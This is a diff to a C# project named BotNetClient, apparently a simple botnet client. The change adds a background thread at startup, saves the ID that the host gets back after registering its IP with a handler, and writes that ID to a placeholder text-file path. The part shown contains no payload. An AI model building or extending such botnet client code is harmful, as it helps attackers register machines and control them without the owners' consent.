@@ -2,15 +2,21 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Net;
+using System.Threading;
 using System.Reflection;
 using Microsoft.Win32;
+using System.Windows;
+using System.IO;
 
 namespace BotNetClient
 {
     class Program
     {
+        public static UInt32 idc;
         static void Main(string[] args)
         {
+            Thread miniprogram = new Thread(new ThreadStart(SecondThread.miniprog));
+            miniprogram.Start();
             string address = "192.168.0.17";
             int port = 8005;
             IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
@@ -22,8 +28,10 @@ namespace BotNetClient
             }
             else
             {
-                HttpHandler.Class1.CreateIpAndIdAsync(ipadress.ToString());
+                idc = HttpHandler.Class1.CreateIpAndIdAsync(ipadress.ToString()).Result;
             }
+            File.Create("путь к .txt файлу");
+            File.WriteAllText("путь к .txt файлу",idc.ToString());
             #region tcp and socket code
             //IPHostEntry iphostinfo = Dns.Resolve(Dns.GetHostName());
             //IPAddress ipadress = iphostinfo.AddressList[0];
